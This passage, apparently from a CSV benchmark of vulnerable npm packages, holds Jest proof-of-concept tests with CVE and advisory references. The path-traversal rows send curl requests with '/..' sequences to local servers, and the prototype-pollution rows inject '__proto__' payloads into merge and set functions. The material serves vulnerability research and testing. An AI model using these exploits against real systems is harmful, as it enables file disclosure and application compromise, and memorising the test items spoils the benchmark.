  let server = ""node ./node_modules/yxxserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:yxxserver:20180306; 
path-traversal,CVE-2017-16105,serverwzl,1.3.1,,path-traversal/serverwzl_1.3.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverwzl"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverwzl/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:serverwzl:20170511; https://github.com/advisories/GHSA-g87g-4x3w-f8jp
path-traversal,CVE-2017-16155,fast-http-cli,0.0.8,,path-traversal/fast-http-cli_0.0.8,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8892/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in fast-http-cli"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8892/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/fast-http-cli/fast-http.js -p 8892"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8892${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:35:16,https://security.snyk.io/vuln/npm:fast-http-cli:20170418; https://github.com/advisories/GHSA-9frq-f867-hgqc
path-traversal,CVE-2017-16142,infraserver,0.0.1,,path-traversal/infraserver_0.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 46372/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in infraserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 46372/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/infraserver/Infra.data.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:46372${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,Infra.data.js:137:9,https://security.snyk.io/vuln/npm:infraserver:20170518; https://github.com/advisories/GHSA-v464-rcx7-j875
path-traversal,,xxf11,1.0.1,,path-traversal/xxf11_1.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8890/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in xxf11"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8890/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/xxf11/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8890${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:8:8,https://security.snyk.io/vuln/npm:xxf11:20170730; 
path-traversal,,express-blinker,0.0.6,,path-traversal/express-blinker_0.0.6,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in express-blinker"", (done) => {
  expect.assertions(1);
  const express = require(""express"");
  let app = express();
  const pkg = require(""express-blinker"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8893/tcp"", () => {});
  } catch (e) {}
  app.use(
    pkg(__dirname, [
      {
        test: /.*/,
        etag: true,
        lastModified: false,
        cacheControl: true,
        expires: false,
        age: 600,
      },
    ])
  );
  app.listen(8893);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8893${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:181:28,https://security.snyk.io/vuln/npm:express-blinker:20180226; 
path-traversal,,gyfserver,1.0.0,,path-traversal/gyfserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in gyfserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/gyfserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:7:8,https://security.snyk.io/vuln/npm:gyfserver:20180315; 
path-traversal,,run-this-place,1.0.2,,path-traversal/run-this-place_1.0.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in run-this-place"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/run-this-place/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:53:37,https://security.snyk.io/vuln/npm:run-this-place:20170508; 
path-traversal,CVE-2017-16212,ltt,1.1.0,,path-traversal/ltt_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ltt"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ltt/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:7:8,https://security.snyk.io/vuln/npm:ltt:20170503; https://github.com/advisories/GHSA-5jg5-w395-9684
path-traversal,,wenluhong1,1.0.0,,path-traversal/wenluhong1_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wenluhong1"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wenluhong1/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:wenluhong1:20170509; https://github.com/advisories/GHSA-224h-p7p5-rh85
prototype-pollution,CVE-2020-28269,field,1.0.1,,prototype-pollution/field_1.0.1,"//https://snyk.io/vuln/SNYK-JS-FIELD-1039884
test(""prototype pollution in field "", () => {
  expect({}.polluted).toBe(undefined);

  const field = require(""field"");
  const obj = {};
  field.set(obj, ""__proto__.polluted"", ""yes"");

  expect(obj.polluted).toBe(""yes"");
});
",,lib/field.js:50:20,https://security.snyk.io/vuln/SNYK-JS-FIELD-1039884; https://github.com/advisories/GHSA-hm82-qr45-h7mw
prototype-pollution,CVE-2021-23624,dotty,0.0.1,0.1.2,prototype-pollution/dotty_0.0.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25912
test(""prototype pollution in dotty"", () => {
  expect({}.polluted).toBe(undefined);

  const dotty = require(""dotty"");
  dotty.put({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/deoxxa/dotty/commit/88f61860dcc274a07a263c32cbe9d44c24ef02d7,lib/index.js:147:17,https://security.snyk.io/vuln/SNYK-JS-DOTTY-1577292; https://github.com/advisories/GHSA-6g47-63mv-qpgh
prototype-pollution,CVE-2020-7765,@firebase/util,0.3.2,0.3.4,prototype-pollution/firebase-util_0.3.2,"//https://hackerone.com/reports/1001218
test(""prototype pollution in @firebase/util"", () => {
  expect({}.polluted).toBe(undefined);

  const utils = require(""@firebase/util"");
  const source = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  utils.deepExtend({}, source);

  expect({}.polluted).toBe(""yes"");
});
",,util/src/deepCopy.ts:68:49,https://security.snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324; https://github.com/advisories/GHSA-fpm5-vv97-jfwg
prototype-pollution,CVE-2020-28472,@aws-sdk/shared-ini-file-loader,1.0.0-rc.8,1.0.0-rc.9,prototype-pollution/aws-sdk-shared-ini-file-loader_1.0.0-rc.8,"//https://security.snyk.io/vuln/SNYK-JS-AWSSDKSHAREDINIFILELOADER-1049304
test(""prototype pollution in @aws-sdk/shared-ini-file-loader"", () => {
  expect({}.polluted).toBe(undefined);
  var fs = require(""fs"");
  var sharedIniFileLoader = require(""@aws-sdk/shared-ini-file-loader"");

  var parsed = sharedIniFileLoader.loadSharedConfigFiles({
    filepath: ""./payload.toml"",
  });
  parsed.then(() => {
    expect({}.polluted).toBe(""yes"");
  });
});
",https://github.com/aws/aws-sdk-js/pull/3585/commits/7d72aff2a941173733fcb6741b104cd83d3bc611,shared-ini-file-loader/src/index.ts:108:20,https://security.snyk.io/vuln/SNYK-JS-AWSSDKSHAREDINIFILELOADER-1049304; https://github.com/advisories/GHSA-rrc9-gqf8-8rwg
prototype-pollution,CVE-2020-28495,total.js,3.4.6,3.4.7,prototype-pollution/total.js_3.4.6,"//https://snyk.io/vuln/SNYK-JS-TOTALJS-1046671
test(""prototype pollution in total.js"", () => {
  const total = require(""total.js"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  U.set({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/totaljs/framework/commit/b3f901561d66ab799a4a99279893b94cad7ae4ff,"utils.js:6624:11, <anonymous",https://security.snyk.io/vuln/SNYK-JS-TOTALJS-1046671; https://github.com/advisories/GHSA-6cf8-qhqj-vjqm
prototype-pollution,,mithril,1.0.0,1.1.7,prototype-pollution/mithril_1.0.0,"//https://snyk.io/vuln/SNYK-JS-MITHRIL-460113
test(""prototype pollution in mithril"", () => {
  require(""mithril/test-utils/browserMock"")(global);
  const m = require(""mithril"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  m.parseQueryString(""__proto__%5Bpolluted%5D=yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/MithrilJS/mithril.js/commit/97fa1788c2184ff4b87fd3f558b7003f9eeee2b1,mithril.js:982:19,https://security.snyk.io/vuln/SNYK-JS-MITHRIL-460113; https://github.com/advisories/GHSA-c3px-v9c7-m734
prototype-pollution,CVE-2020-7788,ini,1.3.5,,prototype-pollution/ini_1.3.5,"//https://snyk.io/vuln/SNYK-JS-INI-1048974
test(""prototype pollution in ini"", () => {
  const fs = require(""fs"");
  const path = require(""path"");
  const ini = require(""ini"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  ini.parse(fs.readFileSync(path.resolve(__dirname, ""./payload.ini""), ""utf-8""));

  expect({}.polluted).toBe(""yes"");
});
",,ini.js:109:14,https://security.snyk.io/vuln/SNYK-JS-INI-1048974; https://github.com/advisories/GHSA-qqgx-2p2h-9c37
prototype-pollution,CVE-2018-3719,mixin-deep,1.3.0,1.3.1,prototype-pollution/mixin-deep_1.3.0,"//https://hackerone.com/reports/311236
test(""prototype pollution in mixin-deep "", () => {
  const mixin = require(""mixin-deep"");
  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  let obj = {};

  expect({}.polluted).toBe(undefined);

  mixin({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jonschlinkert/mixin-deep/commit/578b0bc5e74e14de9ef4975f504dc698796bdf9c,index.js:30:15,https://hackerone.com/reports/311236; https://security.snyk.io/vuln/npm:mixin-deep:20180215; https://github.com/advisories/GHSA-3mpr-hq3p-49h9
prototype-pollution,CVE-2020-7792,mout,1.0.0,1.2.3,prototype-pollution/mout_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25948
test(""prototype pollution in mout "", () => {
  var mout = require(""mout"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  mout.object.set(obj, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,object/set.js:9:48,https://security.snyk.io/vuln/SNYK-JS-MOUT-1014544; 
prototype-pollution,CVE-2021-23444,jointjs,2.2.1,3.4.2,prototype-pollution/jointjs_2.2.1,"//https://snyk.io/vuln/SNYK-JS-JOINTJS-1024444
test(""prototype pollution in jointjs"", () => {
  expect({}.polluted).toBe(undefined);

  const jointjs = require(""jointjs"");
  jointjs.util.setByPath({}, ""__proto__/polluted"", ""yes"", ""/"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/clientIO/joint/commit/e5bf89efef6d5ea572d66870ffd86560de7830a8,dist/joint.min.js:49:1313,https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578; https://github.com/advisories/GHSA-f3pp-32qc-36w4
prototype-pollution,,mergify,1.0.2,,prototype-pollution/mergify_1.0.2,"//https://hackerone.com/reports/439098
test(""prototype pollution in mergify"", () => {
  const mergify = require(""mergify"");
  const payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  mergify({}, JSON.parse(payload));

  expect({}.polluted).toBe(""yes"");
});
",,index.js:15:11,https://security.snyk.io/vuln/SNYK-JS-MERGIFY-72673; https://github.com/advisories/GHSA-3f95-w5h5-fq86
prototype-pollution,CVE-2019-10745,assign-deep,1.0.0,1.0.1,prototype-pollution/assign-deep_1.0.0,"//https://snyk.io/vuln/SNYK-JS-ASSIGNDEEP-450211
test(""prototype pollution in assign-deep "", () => {
  const assign = require(""assign-deep"");
  const payloads = ['{""__proto__"": {""polluted"": ""yes""}}'];

  var obj = {};

  expect({}.polluted).toBe(undefined);

  assign({}, JSON.parse(payloads[0]));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jonschlinkert/assign-deep/commit/90bf1c551d05940898168d04066bbf15060f50cc,index.js:22:23,https://security.snyk.io/vuln/SNYK-JS-ASSIGNDEEP-450211; https://github.com/advisories/GHSA-66rh-8fw6-59q6
prototype-pollution,CVE-2020-28449,decal,2.0.0,,prototype-pollution/decal_2.0.0,"//https://security.snyk.io/vuln/SNYK-JS-DECAL-1051007
test(""prototype pollution in decal"", () => {
  const decal = require(""decal"");

  expect({}.polluted).toBe(undefined);
  decal.set({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,src/utils/set.js:62:21,https://security.snyk.io/vuln/SNYK-JS-DECAL-1051007; https://github.com/advisories/GHSA-vp77-fqqp-79j8
prototype-pollution,CVE-2020-24939,supermixer,1.0.3,1.0.5,prototype-pollution/supermixer_1.0.3,"//hackerone.com/reports/959987

https: test(""prototype pollution in supermixer"", () => {
  var mixer = require(""supermixer"");
  obj = {};

  expect({}.polluted).toBe(undefined);
  var payload = '{""__proto__"":{""polluted"":""yes""}}'; //payload

  mixer.merge({}, JSON.parse(payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/stampit-org/supermixer/commit/94dcc6fc45e0fed96187cb52aaffadf76dbbc0a3,dist/mixer.js:86:19,https://security.snyk.io/vuln/SNYK-JS-SUPERMIXER-607909; https://github.com/advisories/GHSA-7prf-vw4p-qr59
prototype-pollution,CVE-2021-23440,set-value,3.0.0,4.0.1,prototype-pollution/set-value_3.0.0,"//https://snyk.io/vuln/SNYK-JS-SETVALUE-450213
test(""prototype pollution in set-value "", () => {
  const setFn = require(""set-value"");
  const paths = [""__proto__.polluted""];

  var obj = {};

  expect({}.polluted).toBe(undefined);

  setFn({}, paths[0], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jonschlinkert/set-value/commit/7cf8073bb06bf0c15e08475f9f952823b4576452,index.js:41:20,https://security.snyk.io/vuln/SNYK-JS-SETVALUE-1540541; https://github.com/advisories/GHSA-4jqc-8m5r-9rpr
prototype-pollution,,@fluentui/styles,0.47.15,0.50.0,prototype-pollution/fluentui-styles_0.47.15,"//https://snyk.io/vuln/SNYK-JS-FLUENTUISTYLES-570808

test(""prototype pollution in @fluentui/style "", () => {
  const styles = require(""@fluentui/styles"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  const source2 = {
    k3: {},
  };

  expect({}.polluted).toBe(undefined);

  let x = styles.deepmerge(source2, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",,styles/dist/commonjs/deepmerge.ts:16:9,https://security.snyk.io/vuln/SNYK-JS-FLUENTUISTYLES-570808; 
prototype-pollution,CVE-2020-7737,safetydance,2.0.1,,prototype-pollution/safetydance_2.0.1,"//https://snyk.io/vuln/SNYK-JS-SAFETYDANCE-598687

test(""prototype pollution in safetydance"", () => {
  const safetydance = require(""safetydance"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  safetydance.set({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,index.js:215:25,https://security.snyk.io/vuln/SNYK-JS-SAFETYDANCE-598687; 
prototype-pollution,,extend-merge,1.0.5,1.0.6,prototype-pollution/extend-merge_1.0.5,"//https://hackerone.com/reports/878339
test(""prototype pollution in extend-merge"", () => {
  const extend_merge = require(""extend-merge"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  let obj = {};

  expect({}.polluted).toBe(undefined);

  extend_merge.merge({}, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/crysalead-js/extend-merge/commit/6c8dc4e4b5983fa3e85544716f8e347dea2ba3b0,base-extend.js:41:21,https://security.snyk.io/vuln/SNYK-JS-EXTENDMERGE-609868; 
prototype-pollution,CVE-2021-23433,algoliasearch-helper,3.6.0,3.6.2,prototype-pollution/algoliasearch-helper_3.6.0,"//https://security.snyk.io/vuln/SNYK-JS-ALGOLIASEARCHHELPER-1570421
test(""prototype pollution in algoliasearch-helper"", () => {
  const algohelp = require(""algoliasearch-helper"");
  let payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');

  expect({}.polluted).toBe(undefined);

  algohelp.SearchParameters._parseNumbers(payload); // {}

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/algolia/algoliasearch-helper-js/commit/4ff542b70b92a6b81cce8b9255700b0bc0817edd,src/functions/merge.js:38:19,https://security.snyk.io/vuln/SNYK-JS-ALGOLIASEARCHHELPER-1570421; https://github.com/advisories/GHSA-vpf5-82c8-9v36
prototype-pollution,CVE-2021-23574,js-data,3.0.9,,prototype-pollution/js-data_3.0.9,"//https://snyk.io/vuln/SNYK-JS-JSDATA-1023655
test(""prototype pollution in js-data"", () => {
  expect({}.polluted).toBe(undefined);

  const { utils } = require(""js-data"");
  const source = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  utils.deepMixIn({}, source);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/js-data/js-data/pull/579/commits/44d69656ce22a0a0300f1e94eb6dcfefd9dcffa4,src/utils.js:487:18,https://security.snyk.io/vuln/SNYK-JS-JSDATA-1584361; https://github.com/advisories/GHSA-c6h4-gc3f-hgjq
prototype-pollution, CVE-2021-23397,@ianwalter/merge,9.0.1,,prototype-pollution/ianwalter-merge_9.0.1,"//https://security.snyk.io/vuln/SNYK-JS-IANWALTERMERGE-1311022
test(""prototype pollution in @ianwalter/merge"", () => {
  const merge = require(""@ianwalter/merge"");

  expect({}.polluted).toBe(undefined);

  let EVIL_JSON = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  merge({}, EVIL_JSON);
  expect({}.polluted).toBe(""yes"");
});
",,,https://security.snyk.io/vuln/SNYK-JS-IANWALTERMERGE-1311022; 
prototype-pollution,CVE-2021-23442,@cookiex/deep,0.0.6,,prototype-pollution/cookiex-deep_0.0.6,"test(""prototype pollution in @cookiex/deep"", () => {
  const deep = require(""@cookiex/deep"");
  expect({}.polluted).toBe(undefined);

  const target = {};
  deep.default(target, JSON.parse('{""__proto__"":{""polluted"":""yes""}}'));

  expect({}.polluted).toBe(""yes"");
});
",,deep/dist/assigner.js:13:31,https://security.snyk.io/vuln/SNYK-JS-COOKIEXDEEP-1582793; https://github.com/advisories/GHSA-92v9-xh2q-fq9f
prototype-pollution,CVE-2020-28471,properties-reader,2.0.0,2.2.0,prototype-pollution/properties-reader_2.0.0,"//https://snyk.io/vuln/SNYK-JS-PROPERTIESREADER-1048968
test(""prototype pollution in properties-reader"", () => {
  const propertiesReader = require(""properties-reader"");
  const path = require(""path"");

  expect({}.polluted).toBe(undefined);

  propertiesReader(path.resolve(__dirname, ""./payload.ini""));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/steveukx/properties/commit/0877cc871db9865f58dd9389ce99e61be05380a5,src/properties-reader.js:200:27,https://security.snyk.io/vuln/SNYK-JS-PROPERTIESREADER-1048968; 
prototype-pollution,CVE-2018-16491,node.extend,1.0.0,2.0.1,prototype-pollution/node-extend_1.0.0,"//https://hackerone.com/reports/430831
test(""prototype pollution in node.extend "", () => {
  let extend = require(""node.extend"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  extend(true, {}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'));
  expect({}.polluted).toBe(""yes"");
});
",,lib/extend.js:86:26,https://security.snyk.io/vuln/SNYK-JS-NODEEXTEND-73641; https://github.com/advisories/GHSA-r96c-57pf-9jjm
prototype-pollution,CVE-2021-41097,aurelia-path,1.1.0,1.1.7,prototype-pollution/aurelia-path_1.1.7,"//https://security.snyk.io/vuln/SNYK-JS-AURELIAPATH-1292346
test(""prototype pollution in aurelia-path"", () => {
  const ap = require(""aurelia-path"");

  expect({}.polluted).toBe(undefined);

  ap.parseQueryString(""__proto__[polluted]=yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/aurelia/path/releases/tag/1.1.7,dist/commonjs/aurelia-path.js:163:42,https://security.snyk.io/vuln/SNYK-JS-AURELIAPATH-1292346; https://github.com/advisories/GHSA-3c9c-2p65-qvwv; https://github.com/aurelia/path/issues/44
prototype-pollution,CVE-2020-28276,deep-set,1.0.0,,prototype-pollution/deep-set_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28276
test(""prototype pollution in deep-set"", () => {
  expect({}.polluted).toBe(undefined);

  const deepSet = require(""deep-set"");
  const obj = { 1: ""2"" };
  deepSet(obj, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,index.js:33:31,https://security.snyk.io/vuln/SNYK-JS-DEEPSET-1054938; 
prototype-pollution,CVE-2019-10806,vega-util,1.13.0,1.13.1,prototype-pollution/vega-util_1.13.0,"//https://snyk.io/vuln/SNYK-JS-VEGAUTIL-559223

test(""prototype pollution in vega-util"", () => {
  const util = require(""vega-util"");
  const config = ""{style: {point: {shape: triangle-right}}}"";
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  util.mergeConfig(config, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",,build/vega-util.js:203:16,https://security.snyk.io/vuln/SNYK-JS-VEGAUTIL-559223; https://github.com/advisories/GHSA-6hwh-rqwf-cxxr
prototype-pollution,,think-config,1.0.0,1.1.3,prototype-pollution/think-config_1.0.0,"//https://github.com/thinkjs/think-config/commit/31b82468d72f2e1456a27a4827cea378196db6db
test(""prototype pollution in x-assign"", () => {
  const Config = require(""think-config"");
  const config = new Config({ name: 2 });

  expect({}.polluted).toBe(undefined);

  let obj = {};
  config.set(""name.__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/thinkjs/think-config/commit/31b82468d72f2e1456a27a4827cea378196db6db,index.js:50:22,https://github.com/advisories/GHSA-6cj2-92m5-7mvp; https://security.snyk.io/vuln/SNYK-JS-THINKCONFIG-1536566
prototype-pollution,CVE-2018-16489,just-extend,3.0.0,,prototype-pollution/just-extend_3.0.0,"//https://hackerone.com/reports/430291
test(""prototype pollution in just-extend "", () => {
  const extend = require(""just-extend"");

  let obj = {};

  expect({}.polluted).toBe(undefined);

  let payload2 = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
  extend(true, {}, payload2);
  expect({}.polluted).toBe(""yes"");
});
",,index.js:52:23,https://security.snyk.io/vuln/SNYK-JS-JUSTEXTEND-72674; https://github.com/advisories/GHSA-675m-85rw-j3w4
prototype-pollution,CVE-2021-23395,nedb,1.8.0,,prototype-pollution/nedb_1.8.0,"//https://security.snyk.io/vuln/SNYK-JS-TSNODASH-1311009
test(""prototype pollution in nedb"", () => {
  const Datastore = require(""nedb"");
  const db = new Datastore();

  expect({}.polluted).toBe(undefined);

  db.insert({ hello: ""world"" }, (err) => {
    db.update(
      { hello: ""world"" },
      { $set: { ""__proto__.polluted"": ""yes"" } },
      {},
      (err) => {
        expect({}.polluted).toBe(""yes"");
      }
    );
  });
});
",,lib/model.js:304:14,https://security.snyk.io/vuln/SNYK-JS-NEDB-1305279; https://github.com/advisories/GHSA-339j-hqgx-qrrx
prototype-pollution,CVE-2021-3815,@fabiocaccamo/utils.js,0.17.0,,prototype-pollution/fabiocaccamo-utils.js_0.17.0,"//https://security.snyk.io/vuln/SNYK-JS-FABIOCACCAMOUTILSJS-1932614
test(""prototype pollution in @fabiocaccamo/utils.js"", () => {
  const utils = require(""@fabiocaccamo/utils.js"");
  const obj = {};

  expect({}.polluted).toBe(undefined);

  utils.object.keypath.set(obj, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/fabiocaccamo/utils.js/commit/102efafb291ce1916985514440d3bf8a6826890a,utils.js/dist/utils.js:2365:33,https://security.snyk.io/vuln/SNYK-JS-FABIOCACCAMOUTILSJS-1932614; https://github.com/advisories/GHSA-3xph-cp8f-2229
prototype-pollution,CVE-2020-28271,deephas,1.0.5,1.0.7,prototype-pollution/deephas_1.0.5,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28271
test(""prototype pollution in deephas "", () => {
  expect({}.polluted).toBe(undefined);

  const dh = require(""deephas"");
  let obj = {};
